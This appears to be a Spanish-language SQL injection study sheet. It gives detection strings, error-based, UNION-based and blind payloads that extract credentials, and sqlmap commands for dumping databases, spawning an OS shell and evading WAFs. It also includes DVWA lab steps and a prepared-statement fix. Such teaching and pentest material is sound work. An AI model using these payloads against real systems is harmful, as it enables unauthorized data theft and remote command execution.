# SQL Injection

La vulnerabilidad mas critica en aplicaciones web.
Permite leer, modificar y borrar la base de datos, y a veces ejecutar comandos del sistema.

MITRE ATT&CK: T1190 (Exploit Public-Facing Application)

## Como detectar SQLi

### Deteccion manual

```
# Insertar caracteres que rompen la query SQL:
'              -> error de sintaxis SQL
''             -> dos comillas (escape) -> puede funcionar
1' OR '1'='1   -> siempre verdadero
1' AND '1'='2  -> siempre falso
1' OR 1=1--    -> comentario el resto de la query
1' OR 1=1#     -> comentario (MySQL)
```

### Detectar con respuestas

```
URL original:  http://web.com/item?id=1
Prueba 1:      http://web.com/item?id=1'       -> Error SQL = VULNERABLE
Prueba 2:      http://web.com/item?id=1 AND 1=1 -> Igual al original = VULNERABLE
Prueba 3:      http://web.com/item?id=1 AND 1=2 -> Diferente al original = VULNERABLE
```

## Tipos de SQL Injection

### Error-Based (mas facil)

```sql
-- El error SQL revela informacion
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--
' UNION SELECT 1,@@version,3--
' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
```

### UNION-Based (extraer datos)

```sql
-- 1. Encontrar numero de columnas
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--   <- si da error, hay 2 columnas

-- 2. Encontrar columnas visibles
' UNION SELECT NULL,NULL--
' UNION SELECT 1,2--         <- ver que numeros aparecen en la web

-- 3. Extraer datos
' UNION SELECT 1,database()--               -> nombre de la BD
' UNION SELECT 1,group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()--
' UNION SELECT 1,group_concat(column_name) FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT 1,group_concat(username,':',password) FROM users--
```

### Blind SQLi (sin ver la respuesta)

```sql
-- Boolean-based: inferir por True/False
' AND (SELECT SUBSTRING(username,1,1) FROM users WHERE id=1)='a'--
-- Si la pagina responde igual -> primera letra es 'a'

-- Time-based: inferir por tiempo de respuesta
' AND SLEEP(5)--                  -> MySQL
' AND pg_sleep(5)--               -> PostgreSQL
' WAITFOR DELAY '0:0:5'--         -> MSSQL
```

## sqlmap -- Automatizacion completa

```bash
# Deteccion basica
sqlmap -u "http://objetivo.com/item?id=1" --batch

# Con cookie de sesion (autenticado)
sqlmap -u "http://objetivo.com/profile" --cookie="PHPSESSID=abc123" --batch

# Request de Burp Suite
sqlmap -r request.txt --batch

# Extraer bases de datos
sqlmap -u "http://objetivo.com/item?id=1" --dbs --batch

# Extraer tablas de una BD
sqlmap -u "http://objetivo.com/item?id=1" -D nombre_bd --tables --batch

# Extraer datos de una tabla
sqlmap -u "http://objetivo.com/item?id=1" -D nombre_bd -T users --dump --batch

# Intentar RCE (si hay permisos suficientes)
sqlmap -u "http://objetivo.com/item?id=1" --os-shell --batch

# Bypass de WAF
sqlmap -u "http://objetivo.com/item?id=1" --tamper=space2comment,charencode --batch
```

## Practica en DVWA

```
1. Ir a http://localhost:8080
2. Login: admin / password
3. DVWA Security: Low
4. SQL Injection (menu lateral)
5. Probar en el campo User ID:
   - 1' -> ver si hay error
   - 1' OR '1'='1
   - 1' UNION SELECT 1,2--
   - 1' UNION SELECT 1,database()--
   - 1' UNION SELECT 1,group_concat(user,':',password) FROM users--
```

## Mitigacion

```php
// MAL -- query vulnerable
$query = "SELECT * FROM users WHERE id = " . $_GET['id'];

// BIEN -- prepared statements
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$_GET['id']]);
```
